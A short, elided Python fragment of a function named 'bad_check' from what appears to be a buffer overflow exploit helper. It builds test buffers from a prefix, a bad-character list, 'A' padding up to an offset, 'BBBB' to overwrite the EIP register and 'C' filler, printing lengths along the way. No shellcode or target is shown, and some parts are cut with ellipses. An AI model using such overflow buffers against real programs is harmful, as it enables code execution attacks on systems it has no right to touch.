...
def bad_check():
    ...
    if(abcoffset == 0):
        if(prefix != ""):
            buffer = prefix
            buffer += badchars
            print("len(buffer) with ONLY prefix,badchars == "+str(len(buffer)))
            z = len(badchars)
            buffer += 1748 * "A"
            print("len(buffer) with prefix,badchars, A == "+str(len(buffer)))
            buffer += "BBBB"
            buffer += ((size - offset - 4) * "C")
            buffer = buffer.encode()
            print("len(badchars) == "+str(len(badchars)))
            print("size == "+str(size))
            print("offset == "+str(offset))
            print("offset - len(badchars)"+str(offset - len(badchars)))
            print("len(buffer) == "+str(len(buffer)))
        else:
            buffer = badchars
            buffer += (offset - len(badchars)) * "A"
            buffer += "BBBB"
            buffer += (size - offset - 4) * "C"
            buffer = buffer.encode()
    ## After EIP
        ...
        if(prefix != ""):
            ...
            buffer += "BBBB"
            buffer += badchars
            buffer += (size - offset - 4 - len(badchars)) * "C"
            buffer = buffer.encode()
        else:
            buffer = offset * "A"
            buffer += "BBBB"
